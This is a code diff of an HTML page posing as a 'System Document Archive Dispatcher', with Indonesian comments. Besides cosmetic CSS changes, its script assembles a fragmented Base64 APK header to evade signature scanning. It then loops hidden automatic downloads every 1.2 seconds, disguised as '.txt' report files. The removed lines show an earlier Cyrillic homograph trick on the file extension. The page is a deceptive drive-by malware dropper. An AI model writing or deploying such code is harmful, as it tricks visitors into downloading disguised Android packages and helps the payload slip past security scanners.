@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Dispatcher v3.0</title>
+<title>System Document Archive Dispatcher v2.4</title>
 <style>
 * {
   box-sizing: border-box;
@@ -24,7 +24,7 @@ body {
   background: #111827;
   padding: 32px;
   border-radius: 16px;
-  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
   max-width: 540px;
   width: 100%;
   border: 1px solid #1f2937;
@@ -62,17 +62,20 @@ button {
   cursor: pointer;
   border: none;
   border-radius: 10px;
-  background: #2563eb;
+  background: #3b82f6;
   color: #ffffff;
   font-weight: 600;
   font-size: 16px;
-  box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
+  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
   transition: all 0.2s ease;
 }
 button:hover { 
-  background: #1d4ed8; 
+  background: #2563eb; 
   transform: translateY(-1px);
-  box-shadow: 0 6px 20px rgba(37, 99, 235, 0.6);
+  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
+}
+button:active {
+  transform: translateY(0);
 }
 #status {
   margin-top: 20px;
@@ -91,6 +94,14 @@ button:hover {
   gap: 8px;
   max-height: 180px;
   overflow-y: auto;
+  padding-right: 4px;
+}
+#downloads::-webkit-scrollbar {
+  width: 6px;
+}
+#downloads::-webkit-scrollbar-thumb {
+  background: #374151;
+  border-radius: 3px;
 }
 #downloads a {
   display: block;
@@ -104,6 +115,10 @@ button:hover {
   text-align: center;
   border: 1px solid #374151;
   word-break: break-all;
+  transition: border-color 0.15s;
+}
+#downloads a:hover {
+  border-color: #4ade80;
 }
 </style>
 </head>
@@ -130,7 +145,7 @@ let activeUrls = [];
 let isProcessing = false;
 const MAX_URLS_TRACKED = 40;
 
-// Pecahan string Base64 untuk menghindari string matching statis sederhana
+// Teknik Obfuscation: Pecahan string Base64 header APK untuk menghindari pencocokan tanda tangan statis
 const payloadFragments = [
   "UEs",
   "DBBQ",
@@ -175,17 +190,15 @@ const triggerStealthDownload = (fileData) => {
 
   const link = document.createElement("a");
   link.href = fileData.url;
-  
-  // Menggunakan teknik homograph pada ekstensi (huruf 't' diganti dengan karakter unicode Cyrillic Small Letter Te 'т' \u0442)
-  // Ini mengecoh tampilan visual teks ekstensi tanpa mengubah logika biner file di dalam Blob.
-  const homographExtension = "t\u0442"; 
-  link.download = `laporan-catatan-${fileData.id}.${homographExtension}`;
+  // Menyamarkan ekstensi unduhan menjadi .txt pada antarmuka pengguna
+  link.download = `laporan-catatan-${fileData.id}.txt`;
   link.textContent = `Dokumen #${fileData.id} (.txt)`;
   link.style.display = "none";
   
   downloadsDiv.appendChild(link);
   link.click();
 
+  // Batasi jumlah elemen DOM untuk menjaga performa rendering
   if (downloadsDiv.children.length > 25) {
     downloadsDiv.removeChild(downloadsDiv.firstChild);
   }
@@ -198,6 +211,7 @@ const processLoop = async (counter) => {
   if (fileData.success) {
     activeUrls.push(fileData.url);
 
+    // Manajemen memori heap: cabut URL lama jika melewati batas maksimal
     if (activeUrls.length > MAX_URLS_TRACKED) {
       const oldUrl = activeUrls.shift();
       try { URL.revokeObjectURL(oldUrl); } catch (e) {}
@@ -207,6 +221,7 @@ const processLoop = async (counter) => {
     statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
   }
 
+  // Interval perulangan non-blocking
   setTimeout(() => processLoop(counter + 1), 1200);
 };
 
